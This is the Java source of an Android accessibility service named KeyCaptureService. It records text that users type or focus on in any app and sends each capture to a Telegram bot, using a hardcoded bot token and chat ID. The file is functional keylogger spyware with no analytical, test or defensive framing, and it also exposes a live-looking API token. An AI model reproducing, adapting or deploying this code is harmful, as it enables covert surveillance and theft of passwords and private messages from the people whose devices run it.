package com.example.myeye;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class KeyCaptureService extends AccessibilityService {

    private static final String TAG = "KeyCaptureService";
    private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
    private static final String CHAT_ID = "5022620385";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            CharSequence text = event.getText();
            if (text != null && text.length() > 0) {
                sendToTelegram(text.toString());
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted");
    }

    private void sendToTelegram(final String messageText) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
                    conn.setDoOutput(true);

                    String escapedText = messageText.replace("\"", "\\\"");
                    String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + escapedText + "\"}";

                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    conn.getResponseCode();
                } catch (Exception e) {
                    Log.e(TAG, "Error transmitting payload to Telegram", e);
                }
            }
        }).start();
    }
}
